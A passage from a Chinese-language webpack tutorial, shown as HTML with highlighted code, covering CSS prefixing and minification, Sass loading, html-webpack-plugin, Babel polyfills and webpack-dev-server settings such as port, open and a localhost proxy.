class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json 文件</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;browserslist&quot;: [&#x27;last 2 versions&#x27;, &#x27;&gt; 1%&#x27;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># .browserslsetrc 文件</span><br><span class="line">last 2 versions</span><br><span class="line">&gt; 1%</span><br></pre></td></tr></table></figure><p>但如果你多个地方都配置的话，<code>overrideBrowserslist</code>的优先级是最高的。</p><p>接下来，我们修改一下<code>style.css</code>，使用一下比较新的特性。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后打包一下，看看打包出来后的<code>main.css</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">display</span>: -ms-flexbox;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压缩css代码"><a href="#压缩css代码" class="headerlink" title="压缩css代码"></a>压缩css代码</h3><p>当我们需要压缩<code>css</code>代码的时候，可以使用<code>postcss</code>另一个插件——<code>cssnano</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 5.0.7</span></span><br><span class="line">yarn add cssnano -D</span><br></pre></td></tr></table></figure><p>然后还是在<code>postcss</code>配置文件中引入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        ... ,</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;cssnano&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包一下，看看<code>main.css</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">display</span>:-webkit-box;<span class="attribute">display</span>:-ms-flexbox;<span class="attribute">display</span>:flex&#125;</span><br></pre></td></tr></table></figure><h3 id="解析CSS预处理器"><a href="#解析CSS预处理器" class="headerlink" title="解析CSS预处理器"></a>解析CSS预处理器</h3><p>在现在我们实际开发中，我们会更多使用<code>Sass</code>、<code>Less</code>或者<code>stylus</code>这类<code>css</code>预处理器。而其实<code>html</code>是无法直接解析这类文件的，因此我们需要使用对应的<code>loader</code>将其转换成<code>css</code>。</p><p>接下来，我就以<code>sass</code>为例，来讲一下如何使用<code>webpack</code>解析<code>sass</code>。</p><p>首先我们需要安装一下<code>sass</code>和<code>sass-loader</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sass -&gt; 1.36.0, sass-loader -&gt; 12.1.0</span></span><br><span class="line">yarn add sass sass-loader -D</span><br></pre></td></tr></table></figure><p>然后我们在<code>module</code>加上<code>sass</code>的匹配规则，<code>sass-loader</code>的执行顺序应该是排第一，我们需要先将其转换成<code>css</code>，然后才能执行后续的操作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.(scss|sass)$/</span>,</span><br><span class="line">    use: [miniCssExtractPlugin.loader, <span class="string">&#x27;css-loader&#x27;</span>, <span class="string">&#x27;postcss-loader&#x27;</span>, <span class="string">&#x27;sass-loader&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>然后我们在项目中新建一个<code>style.scss</code>。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$color-white</span>: <span class="number">#fff</span>;</span><br><span class="line"><span class="variable">$color-black</span>: <span class="number">#222</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="variable">$color-black</span>;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$color-white</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>index.js</code>引入。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./style.css&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./style.scss&quot;</span>;</span><br></pre></td></tr></table></figure><p>然后执行打包，再看看打包出来的<code>main.css</code>，<code>scss</code>文件内容被解析到里面，同时如果我们引入多个<code>css</code>或<code>css</code>预处理器文件的话，<code>miniCssExtractPlugin</code>也会将其打包成一个<code>bundle</code>文件里面。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">display</span>:-webkit-box;<span class="attribute">display</span>:-ms-flexbox;<span class="attribute">display</span>:flex&#125;</span><br><span class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">background</span>:<span class="number">#222</span>&#125;<span class="selector-tag">body</span> <span class="selector-tag">div</span>&#123;<span class="attribute">color</span>:<span class="number">#fff</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="HTML模板"><a href="#HTML模板" class="headerlink" title="HTML模板"></a>HTML模板</h2><p>当我们是<code>Web</code>项目的时候，我们必然会存在<code>html</code>文件去实现页面。</p><p>而对于其他类型的文件，比如<code>css</code>、图片、文件等等，我们是可以通过引入入口<code>js</code>文件，然后通过<code>loader</code>进行解析打包。而对于<code>html</code>文件，我们不可能将其引入到入口文件然后解析打包，反而我们还需要将打包出来的<code>bundle</code>文件引入<code>html</code>文件去使用，</p><p>因此，其实我们需要实现的操作只有两个，一个是复制一份<code>html</code>文件到打包路径下，另一个就是将打包出来的<code>bundle</code>文件自动引入到<code>html</code>文件中去。</p><p>这时候我们需要使用一个插件来实现这些功能——<code>html-webpack-plugin</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 5.3.2</span></span><br><span class="line">yarn add html-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>安装插件后，我们先在<code>src</code>文件下新建一下<code>index.html</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Webpack Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里面我们暂时不需要引入任何模块。</p><p>接下来配置一下<code>webpack</code>。一般<code>plugin</code>插件都是一个类，而我们需要在<code>plugins</code>选项中需要创建一个插件实例。</p><p>对于<code>htmlWebpackPlugin</code>插件，我们需要传入一些配置：<code>html</code>模板地址<code>template</code>和打包出来的文件名<code>filename</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="comment">// 引入htmlWebpackPlugin</span></span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="comment">// 使用htmlWebpackPlugin插件</span></span><br><span class="line">        <span class="keyword">new</span> htmlWebpackPlugin(&#123;</span><br><span class="line">          <span class="comment">// 指定html模板</span></span><br><span class="line">            template: <span class="string">&#x27;./src/index.html&#x27;</span>,  </span><br><span class="line">          <span class="comment">// 自定义打包的文件名</span></span><br><span class="line">            filename: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来执行一下打包，就会发现<code>dist</code>文件下会生成一个<code>index.html</code>。打开会发现，<code>webpack</code>会自动将<code>bundle</code>文件引入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Webpack Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们有多个<code>chunk</code>的时候，我们可以指定该<code>html</code>要引入哪些<code>chunk</code>。在<code>htmlWebpackPlugin</code>配置中有一个<code>chunks</code>选项，是一个数组，你只需要加入你想引入的<code>chunkName</code>即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="comment">// 引入htmlWebpackPlugin</span></span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">      index: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">      main: <span class="string">&#x27;./src/main.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> htmlWebpackPlugin(&#123;</span><br><span class="line">            template: <span class="string">&#x27;./src/index.html&#x27;</span>,  </span><br><span class="line">            filename: <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">          chunks: [<span class="string">&quot;index&quot;</span>]  <span class="comment">// 只引入index chunk</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打包完成后，<code>dist</code>文件下会出现<code>index.html</code>、<code>index.js</code>和<code>main.js</code>，但是<code>index.html</code>只会引入<code>index.js</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    HelloWorld！</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们需要实现多页面的话，只需要再<code>new</code>一个<code>htmlWebpackPlugin</code>实例即可，这里就不再多说。</p><h2 id="JavaScript转义"><a href="#JavaScript转义" class="headerlink" title="JavaScript转义"></a>JavaScript转义</h2><p>不仅仅<code>css</code>需要转义，<code>JavaScript</code>也要为了兼容多浏览器进行转义，因此我们需要用到<code>babel</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 8.2.2</span></span><br><span class="line">yarn add babel-loader -D</span><br></pre></td></tr></table></figure><p>同时，我们需要使用<code>babel</code>中用于<code>JavaScript</code>兼容的插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> @babel/preset-env -&gt; 7.14.9; @babel/core -&gt; 7.14.8; @core-js -&gt; 3.16.0</span></span><br><span class="line">yarn add @babel/preset-env @babel/core core-js -D</span><br></pre></td></tr></table></figure><p>接下来，我们需要配置一下<code>webpack</code>的配置文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  use: [<span class="string">&#x27;babel-loader&#x27;</span>] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们需要配置一下<code>babel</code>。当然我们可以直接在<code>webpack.config.js</code>里面配置，但是<code>babel</code>同样也提供了配置文件<code>.babelrc</code>，因此我们就直接在这边进行配置。</p><p>在根路径新建一个<code>.babelrc</code>。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;presets&quot;</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;@babel/preset-env&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="comment">// 浏览器版本</span></span><br><span class="line">        <span class="attr">&quot;targets&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;edge&quot;</span>: <span class="string">&quot;17&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;chrome&quot;</span>: <span class="string">&quot;67&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">         <span class="comment">// 配置corejs版本，但需要额外安装corejs</span></span><br><span class="line">        <span class="attr">&quot;corejs&quot;</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="comment">// 加载情况</span></span><br><span class="line">        <span class="comment">// entry: 需要在入口文件进入@babel/polyfill，然后babel根据使用情况按需载入</span></span><br><span class="line">        <span class="comment">// usage: 无需引入，自动按需加载</span></span><br><span class="line">        <span class="comment">// false: 入口文件引入，全部载入</span></span><br><span class="line">        <span class="attr">&quot;useBuiltIns&quot;</span>: <span class="string">&quot;usage&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们来测试一下，先修改一下<code>index.js</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">&#x27;HelloWorld&#x27;</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后执行<code>yarn build</code>进行打包。</p><p>在使用<code>babel</code>之前，打包出来的<code>main.js</code>如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="string">&quot;use strict&quot;</span>;<span class="keyword">new</span> <span class="built_in">Promise</span>((<span class="function"><span class="params">o</span>=&gt;</span>&#123;o(<span class="string">&quot;HelloWorld&quot;</span>)&#125;)).then((<span class="function"><span class="params">o</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(o)&#125;))&#125;();</span><br></pre></td></tr></table></figure><p>上面打包代码是直接使用了<code>Promise</code>，而没有考虑到低版本浏览器的兼容。然后我们打开<code>babel</code>后，执行一下打包命令，会发现代码多出了很多。</p><p>而在打包代码中，可以看到<code>webpack</code>使用了<code>polyfill</code>实现<code>promise</code>类，然后再去调用，从而兼容了低版本浏览器没有<code>promise</code>属性问题。</p><h2 id="Webpack本地服务"><a href="#Webpack本地服务" class="headerlink" title="Webpack本地服务"></a>Webpack本地服务</h2><p>当我们使用<code>webpack</code>的时候，不仅仅只是用于打包文件，大部分我们还会依赖<code>webpack</code>来搭建本地服务，同时利用其热更新的功能，让我们更好的开发和调试代码。</p><p>接下来我们来安装一下<code>webpack-dev-server</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 版本为3.11.2</span></span><br><span class="line">yarn add webpack-dev-server -D</span><br></pre></td></tr></table></figure><p>然后执行下列代码开启服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx webpack serve</span><br></pre></td></tr></table></figure><p>或者在package.json配置一下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;serve&quot;: &quot;webpack serve --mode development&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过<code>yarn serve</code>运行。</p><p>这时，webpack会默认开启<code>http://localhost:8080/</code>服务（具体看你们运行返回的代码），而该服务指向的是<code>dist/index.html</code>。</p><p>但你会发现，你的<code>dist</code>中其实是没有任何文件的，这是因为<code>webpack</code>将实时编译后的文件都保存到了内存当中。</p><h3 id="webpack-dev-server的好处"><a href="#webpack-dev-server的好处" class="headerlink" title="webpack-dev-server的好处"></a>webpack-dev-server的好处</h3><p>其实<code>webpack</code>自带提供了<code>--watch</code>命令，可以实现动态监听文件的改变并实时打包，输出新的打包文件。</p><p>但这种方案存在着几个缺点，一就是每次你一修改代码，webpack就会全部文件进行重新打包，这时候每次更新打包的速度就会慢了很多；其次，这样的监听方式做不到热更新，即每次你修改代码后，webpack重新编译打包后，你就得手动刷新浏览器，才能看到最新的页面结果。</p><p>而<code>webpack-dev-server</code>，却有效了弥补这两个问题。它的实现，是使用了<code>express</code>启动了一个<code>http</code>服务器，来伺候资源文件。然后这个<code>http</code>服务器和客户端使用了<code>websocket</code>通讯协议，当原始文件作出改动后，<code>webpack-dev-server</code>就会实时编译，然后将最后编译文件实时渲染到页面上。</p><h3 id="webpack-dev-server配置"><a href="#webpack-dev-server配置" class="headerlink" title="webpack-dev-server配置"></a>webpack-dev-server配置</h3><p>在<code>webpack.config.js</code>中，有一个<code>devServer</code>选项是用来配置<code>webpack-dev-server</code>，这里简单讲几个比较常用的配置。</p><h4 id="port"><a href="#port" class="headerlink" title="port"></a>port</h4><p>我们可以通过port来设置服务器端口号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  </span><br><span class="line">    ...</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 配置webpack-dev-server</span></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8888</span>,  <span class="comment">// 自定义端口号</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>在<code>devServer</code>中有一个<code>open</code>选项，默认是为<code>false</code>，当你设置为<code>true</code>的时候，你每次运行<code>webpack-dev-server</code>就会自动帮你打开浏览器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  </span><br><span class="line">    ...</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 配置webpack-dev-server</span></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        open: <span class="literal">true</span>,   <span class="comment">// 自动打开浏览器窗口</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h4><p>这个选项是用来设置本地开发的跨域代理的，关于跨域的知识就不多在这说了，这里就说说如何去配置。</p><p><code>proxy</code>的值必须是一个对象，在里面我们可以配置一个或多个跨域代理。最简单的配置写法就是地址配上<code>api</code>地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  </span><br><span class="line">    ...</span><br><span class="line">  </span><br><span class="line">    devServer: &#123;</span><br><span class="line">      <span class="comment">// 跨域代理</span></span><br><span class="line">        proxy: &#123;</span><br><span class="line">          <span class="string">&#x27;/api&#x27;</span>: <span class="string">&#x27;http://localhost:3000&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这时候，当你请求<code>/api/users</code>的时候，就会代理到<code>http://localhost:3000/api/users</code>。</p><p>如果你不需要传递<code>/api</code>的话，你就需要使用对象的写法，从而增加一些配置选项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    devServer: &#123;</span><br><span class="line">      <span class="comment">// 跨域代理</span></span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">              target: <span class="string">&#x27;http://localhost:3000&#x27;</span>,  <span class="comment">// 代理地址</span></span><br><span class="line">              pathRewrite: &#123; <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span> &#125;,   <span class="comment">// 重写路径</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这时候，当你请求<code>/api/users</code>的时候，就会代理到<code>http://localhost:3000/users</code>。</p><p>在proxy中的选项，还有两个比较常用的，一个就是<code>changeOrigin</code>，默认情况下，代理时会保留主机头的来源，当我们将其设置为<code>true</code>可以覆盖这种行为；还有一个是<code>secure</code>选项，当你的接口使用了<code>https</code>的时候，需要将其设置为<code>false</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 